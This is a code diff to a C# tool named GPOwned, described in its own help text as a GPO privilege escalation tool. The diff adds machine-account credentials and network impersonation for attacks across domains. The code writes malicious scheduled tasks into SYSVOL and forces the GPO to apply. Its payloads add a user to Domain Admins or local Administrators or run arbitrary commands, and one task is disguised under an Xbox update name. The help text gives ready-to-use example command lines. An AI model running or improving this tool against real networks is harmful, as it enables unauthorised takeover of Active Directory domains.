@@ -2,6 +2,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Reflection;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using GPOwned.Shared;
@@ -25,30 +26,33 @@ namespace GPOwned
                 return 0;
             }
 
-            string guid        = GetArg(args, "--guid",    "-guid");
-            string gpoName     = GetArg(args, "--gpo",     "-gpo");
-            string computer    = GetArg(args, "--computer","-c");
-            string domainArg   = GetArg(args, "--domain",  "-d");
-            string user        = GetArg(args, "--user",    "-u");
-            string author      = GetArg(args, "--author",  "-a");
-            string intervalStr = GetArg(args, "--interval","-int");
-            string xmlPath     = GetArg(args, "--xml",     "-xml");
-            string stxPath     = GetArg(args, "--stx",     "-stx");
-            string scmd        = GetArg(args, "--scmd",    "-scmd");
-            string sps         = GetArg(args, "--sps",     "-sps");
-            string cmdArg      = GetArg(args, "--cmd",     "-cmd");
-            string psArg       = GetArg(args, "--ps",      "--powershell", "-ps");
+            string guid        = GetArg(args, "--guid",           "-guid");
+            string gpoName     = GetArg(args, "--gpo",            "-gpo");
+            string computer    = GetArg(args, "--computer",       "-c");
+            string domainArg   = GetArg(args, "--domain",         "-d");
+            string user        = GetArg(args, "--user",           "-u");
+            string author      = GetArg(args, "--author",         "-a");
+            string intervalStr = GetArg(args, "--interval",       "-int");
+            string xmlPath     = GetArg(args, "--xml",            "-xml");
+            string stxPath     = GetArg(args, "--stx",            "-stx");
+            string scmd        = GetArg(args, "--scmd",           "-scmd");
+            string sps         = GetArg(args, "--sps",            "-sps");
+            string cmdArg      = GetArg(args, "--cmd",            "-cmd");
+            string psArg       = GetArg(args, "--ps",             "--powershell", "-ps");
 
-            // Single quotes in payload args become double quotes in the generated XML.
-            // Lets callers write: --scmd "net group 'Domain Admins' user /add /dom"
+            // Machine account credentials for authenticating to AD / SYSVOL
+            string machineAcct = GetArg(args, "--machineaccount", "-machineaccount", "--ma", "-ma");
+            string machinePass = GetArg(args, "--machinepassword","-machinepassword","--mp", "-mp");
+
+            // Allow single quotes as stand-ins for double quotes in payload args.
             if (scmd   != null) scmd   = scmd.Replace('\'', '"');
             if (sps    != null) sps    = sps.Replace('\'', '"');
             if (cmdArg != null) cmdArg = cmdArg.Replace('\'', '"');
             if (psArg  != null) psArg  = psArg.Replace('\'', '"');
 
-            string logPath     = GetArg(args, "--log",     "-log");
-            bool   da          = HasFlag(args, "--da",   "-da");
-            bool   local       = HasFlag(args, "--local","-local");
+            string logPath = GetArg(args, "--log",   "-log");
+            bool   da      = HasFlag(args, "--da",   "-da");
+            bool   local   = HasFlag(args, "--local","-local");
 
             if (string.IsNullOrEmpty(guid) && string.IsNullOrEmpty(gpoName))
             {
@@ -85,6 +89,38 @@ namespace GPOwned
                 return 1;
             }
 
+            // Configure alternate credentials for AD and SYSVOL
+            string credUser = null, credPass = null;
+            if (!string.IsNullOrEmpty(machineAcct))
+            {
+                credUser = NormalizeMachineAccount(machineAcct);
+                credPass = machinePass;
+                Output.Gray("Auth   : " + credUser + "  (machine account)");
+            }
+
+            if (!string.IsNullOrEmpty(credUser))
+            {
+                AdHelper.SetCredentials(credUser, credPass);
+                if (!string.IsNullOrEmpty(domainArg))
+                    AdHelper.SetTargetDomain(domainArg);
+            }
+
+            // Establish LOGON_NEW_CREDENTIALS token for SYSVOL/UNC writes
+            WindowsImpersonationContext impCtx = null;
+            if (!string.IsNullOrEmpty(credUser))
+            {
+                try
+                {
+                    impCtx = AdHelper.BeginNetworkImpersonation();
+                    Output.Green("Impersonation OK — LDAP and SYSVOL will use " + credUser);
+                }
+                catch (Exception ex)
+                {
+                    Output.Red("Failed to logon with machine account: " + ex.Message);
+                    return 1;
+                }
+            }
+
             TeeWriter tee = null;
             if (!string.IsNullOrEmpty(logPath))
                 tee = new TeeWriter(logPath);
@@ -101,7 +137,8 @@ namespace GPOwned
             }
             finally
             {
-                if (tee != null) tee.Stop();
+                if (tee     != null) tee.Stop();
+                if (impCtx  != null) impCtx.Undo();
             }
             return exitCode;
         }
@@ -112,21 +149,21 @@ namespace GPOwned
             string xmlPath, string stxPath, string scmd, string sps,
             string cmdArg, string psArg, bool da, bool local)
         {
-            // ── 1. Domain info ────────────────────────────────────────────────────
+            // ── 1. Domain info ──────────────────────────────────────────────
+            // Pass domainArg so that when a target domain is specified we get the
+            // correct domainDN for LDAP paths, not just the forest root.
             string domain, domainDN;
             try
             {
-                AdHelper.GetDomainInfo(out domain, out domainDN);
+                AdHelper.GetDomainInfo(domainArg, out domain, out domainDN);
             }
             catch (Exception ex)
             {
                 Output.Red("Failed to contact domain controller: " + ex.Message);
                 return 1;
             }
-            if (!string.IsNullOrEmpty(domainArg))
-                domain = domainArg;
 
-            // ── 2. Resolve GPO GUID ───────────────────────────────────────────
+            // ── 2. Resolve GPO GUID ─────────────────────────────────────────
             if (!string.IsNullOrEmpty(gpoName) && string.IsNullOrEmpty(guid))
             {
                 guid = AdHelper.ResolveGpoGuid(gpoName, domainDN);
@@ -143,7 +180,7 @@ namespace GPOwned
 
             Output.SectionHeader("Preflight Checks");
 
-            // ── 3. ACL check ─────────────────────────────────────────────────────
+            // ── 3. ACL check ────────────────────────────────────────────────
             if (!AdHelper.CheckGpoWriteAccess(guidBraced, domainDN))
             {
                 Output.Red("No write access to this GPO. Aborting.");
@@ -151,7 +188,7 @@ namespace GPOwned
             }
             Output.Green("Write access confirmed on GPO " + guidBraced);
 
-            // ── 4. GPO enabled status ─────────────────────────────────────────────
+            // ── 4. GPO enabled status ───────────────────────────────────────
             int flags        = AdHelper.GetGpoFlags(guidBraced, domainDN);
             bool flagsChanged = (flags & 2) == 2;
             if (flagsChanged)
@@ -164,13 +201,12 @@ namespace GPOwned
                 Output.Gray("GPO status: AllSettingsEnabled");
             }
 
-            // ── 5. Back up extension names ──────────────────────────────────────
+            // ── 5. Back up extension names ──────────────────────────────────
             string initialExt = AdHelper.GetGpoExtensionNames(guidBraced, domainDN);
             bool noExt = string.IsNullOrEmpty(initialExt);
-
             Output.Gray("gPCMachineExtensionNames: " + (noExt ? "<not set>" : initialExt));
 
-            // ── 6. Find DA author ──────────────────────────────────────────────
+            // ── 6. Find DA author ───────────────────────────────────────────
             string daUser = author;
             if (string.IsNullOrEmpty(daUser))
             {
@@ -184,7 +220,7 @@ namespace GPOwned
             Output.Gray("Task author  : " + daUser);
             Output.Gray("Target DC    : " + computer);
 
-            // ── 7. Load & validate primary XML ─────────────────────────────────
+            // ── 7. Load & validate primary XML ─────────────────────────────
             string xmlContent;
             if (!string.IsNullOrEmpty(xmlPath))
             {
@@ -209,12 +245,12 @@ namespace GPOwned
 
             Output.SectionHeader("Payload Deployment");
 
-            // ── 8. Deploy primary XML to SYSVOL ──────────────────────────────────
+            // ── 8. Deploy primary XML to SYSVOL ────────────────────────────
             string sysvolXmlPath = SysvolHelper.ScheduledTasksPath(domain, guidBraced);
             bool backedUp = SysvolHelper.DeployXml(xmlContent, sysvolXmlPath, Encoding.ASCII);
             Output.Green("ScheduledTasks.xml deployed to SYSVOL" + (backedUp ? " (existing file backed up)" : "") + ".");
 
-            // ── 9. Deploy second-task files if --stx ─────────────────────────────
+            // ── 9. Deploy second-task files if --stx ───────────────────────
             if (!string.IsNullOrEmpty(stxPath))
             {
                 string wsaddContent;
@@ -230,10 +266,10 @@ namespace GPOwned
                 }
                 Output.Green("Second XML file is valid.");
 
-                string boundary    = DateTime.Now.AddMinutes(1).ToString("s");
+                string boundary      = DateTime.Now.AddMinutes(1).ToString("s");
                 string wsaddFilePath = SysvolHelper.WsaddPath(domain, guidBraced);
-                string cmdType    = !string.IsNullOrEmpty(scmd) ? "cmd.exe"       : "powershell.exe";
-                string argument   = !string.IsNullOrEmpty(scmd) ? scmd            : sps;
+                string cmdType       = !string.IsNullOrEmpty(scmd) ? "cmd.exe"       : "powershell.exe";
+                string argument      = !string.IsNullOrEmpty(scmd) ? scmd            : sps;
 
                 string addBat = BuildAddBat(domain, guidBraced);
                 SysvolHelper.DeploySecondTaskFiles(domain, guidBraced, wsaddContent, addBat);
@@ -247,7 +283,7 @@ namespace GPOwned
                 SysvolHelper.PatchXml(wsaddFilePath, wsaddTokens, Encoding.Unicode);
             }
 
-            // ── 10. Patch primary ScheduledTasks.xml based on mode ──────────────────
+            // ── 10. Patch primary ScheduledTasks.xml based on mode ──────────
             var tokens = BuildPrimaryTokens(da, local, stxPath, cmdArg, psArg,
                                             user, daUser, computer, domain, guidBraced);
             if (tokens == null)
@@ -267,7 +303,7 @@ namespace GPOwned
 
             Output.SectionHeader("Activating GPO");
 
-            // ── 11. Update AD versionNumber ───────────────────────────────────────
+            // ── 11. Update AD versionNumber ─────────────────────────────────
             try
             {
                 int currentVer = AdHelper.GetGpoVersionNumber(guidBraced, domainDN);
@@ -285,11 +321,11 @@ namespace GPOwned
                 return 1;
             }
 
-            // ── 12. Update GPT.INI ──────────────────────────────────────────────
+            // ── 12. Update GPT.INI ──────────────────────────────────────────
             SysvolHelper.UpdateGptIni(domain, guidBraced);
             Output.Green("GPT.INI version incremented.");
 
-            // ── 13. Update gPCMachineExtensionNames ─────────────────────────────
+            // ── 13. Update gPCMachineExtensionNames ─────────────────────────
             AdHelper.SetGpoExtensionNames(guidBraced, domainDN,
                 ExtToAdd + (initialExt != null ? initialExt : ""));
 
@@ -305,11 +341,11 @@ namespace GPOwned
                 return 1;
             }
 
-            // ── 14. Poll loop ──────────────────────────────────────────────────────
+            // ── 14. Poll loop ───────────────────────────────────────────────
             Output.SectionHeader("Waiting for Execution");
             Poll(da, local, stxPath, cmdArg, psArg, user, computer, domainDN, computer, interval);
 
-            // ── 15. Cleanup ───────────────────────────────────────────────────────
+            // ── 15. Cleanup ─────────────────────────────────────────────────
             Output.SectionHeader("Cleanup");
 
             if (noExt)
@@ -485,6 +521,22 @@ namespace GPOwned
                    "Register-ScheduledTask -Xml $Task -TaskName XboxLiveUpdateWatchdog\"";
         }
 
+        // Ensures a machine account name ends with '$'.
+        static string NormalizeMachineAccount(string name)
+        {
+            if (name.Contains("\\"))
+            {
+                int slash   = name.LastIndexOf('\\');
+                string dom  = name.Substring(0, slash + 1);
+                string acct = name.Substring(slash + 1);
+                if (!acct.EndsWith("$")) acct += "$";
+                return dom + acct;
+            }
+            if (!name.Contains("@") && !name.EndsWith("$"))
+                name += "$";
+            return name;
+        }
+
         static string LoadEmbeddedText(string logicalName, Encoding enc)
         {
             var asm = Assembly.GetExecutingAssembly();
@@ -517,31 +569,36 @@ namespace GPOwned
 GPOwned.exe - GPO Privilege Escalation Tool
 
 IDENTITY (one required):
-  --guid <GUID>           GPO GUID (with or without braces)
-  --gpo  <name>           GPO display name
+  --guid <GUID>                  GPO GUID (with or without braces)
+  --gpo  <name>                  GPO display name
 
 TARGET:
-  --computer / -c <fqdn>  Target computer FQDN (required)
-  --domain   / -d <fqdn>  Target domain FQDN   (default: current forest root)
-  --user     / -u <user>  User to elevate (required for --da and --local)
-  --author   / -a <user>  DA account for task author (auto-detected if omitted)
-  --interval / -int <n>   Minutes to wait (default: 90)
+  --computer / -c <fqdn>         Target computer FQDN (required)
+  --domain   / -d <fqdn>         Target domain FQDN (default: current forest root)
+  --user     / -u <user>         User to elevate (required for --da and --local)
+  --author   / -a <user>         DA account for task author (auto-detected if omitted)
+  --interval / -int <n>          Minutes to wait (default: 90)
+
+MACHINE ACCOUNT (for cross-domain / Authenticated Users write scenarios):
+  --machineaccount / --ma <name> Machine account name ($ appended automatically)
+                                 Accepts: PC01  |  PC01$  |  DOMAIN\PC01
+  --machinepassword / --mp <pw>  Machine account password
 
 PAYLOAD (one required):
-  --da                    Add --user to Domain Admins
-  --local                 Add --user to local Administrators on --computer
-  --cmd  <command>        Execute a CMD command
-  --ps   <command>        Execute a PowerShell command
+  --da                           Add --user to Domain Admins
+  --local                        Add --user to local Administrators on --computer
+  --cmd  <command>               Execute a CMD command
+  --ps   <command>               Execute a PowerShell command
 
 SECOND XML TECHNIQUE:
-  --stx  <path|.>         wsadd.xml path (. = use embedded). Triggers second-task technique.
-  --scmd <command>        CMD command for second XML
-  --sps  <command>        PowerShell command for second XML
+  --stx  <path|.>                wsadd.xml path (. = use embedded)
+  --scmd <command>               CMD command for second XML
+  --sps  <command>               PowerShell command for second XML
 
 MISC:
-  --xml  <path>           Custom ScheduledTasks.xml (default: embedded template)
-  --log  <path>           Log all output to file
-  --help / -h             Show this help
+  --xml  <path>                  Custom ScheduledTasks.xml
+  --log  <path>                  Log all output to file
+  --help / -h                    Show this help
 
 EXAMPLES:
   DA escalation via DC-linked GPO:
@@ -550,11 +607,14 @@ EXAMPLES:
   Local admin via workstation GPO:
     GPOwned.exe --guid {387547AA-B67F-4D7B-A524-AE01E56751DD} --computer pc01.domain.local --user jdoe --local
 
+  Cross-domain using machine account (Authenticated Users write):
+    GPOwned.exe --gpo ""SomePolicy"" --computer dc01.other.corp --domain other.corp --da --user jdoe --ma PC01 --mp Sup3rS3cr3t
+
   Custom command:
     GPOwned.exe --gpo ""My GPO"" --computer dc01.domain.local --cmd ""whoami > C:\out.txt""
 
   Second-task (DA via workstation with DA session):
-    GPOwned.exe --guid {D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA} --computer pc01.domain.local --author DAUser --stx . --scmd ""/r net group \"\"domain admins\"\" jdoe /add /dom""
+    GPOwned.exe --guid {D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA} --computer pc01.domain.local --author DAUser --stx . --scmd ""/r net group \"\"\"\"domain admins\"\"\"\" jdoe /add /dom""
 ");
         }
     }
